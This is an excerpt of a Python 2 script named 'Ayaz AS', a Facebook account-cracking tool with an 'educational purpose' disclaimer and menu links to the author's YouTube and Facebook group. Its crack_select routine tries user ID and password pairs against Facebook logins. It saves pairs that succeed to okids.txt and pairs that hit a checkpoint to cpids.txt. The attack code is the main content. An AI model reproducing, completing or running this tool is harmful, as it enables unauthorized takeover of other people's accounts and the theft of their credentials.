#Script Given By Shafaqat
#Script Is Given For Educational Purpose
#Script Edited By @Shafaqat
#Utf-8 python 
...
\n\033[0m----------------------------------
\033[1;92mTool Name \033[1;93m: Ayaz AS
\033[1;92mAuthor \033[1;93m: Ayaz Hussain
\033[1;92mFb \033[1;93m: Dark Hunt3r
\033[1;92mDisclaimer \033[1;93m: this tool is only For Educational Purpose!
\033[0m----------------------------------
...
def main():
    ...
    print ' \033[0m[2].\x1b[1;96m Subscribe on YouTube '
    print ' \033[0m[3].\x1b[1;96m Join Facebook Group'
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://youtube.com/channel/UCEKAuwNkXV_1igRtkJkzwrw ')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://www.facebook.com/groups/675580167087512/?ref=share')
        main()
    else:
        print ''
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[Ayaz AS-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[Ayaz AS-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
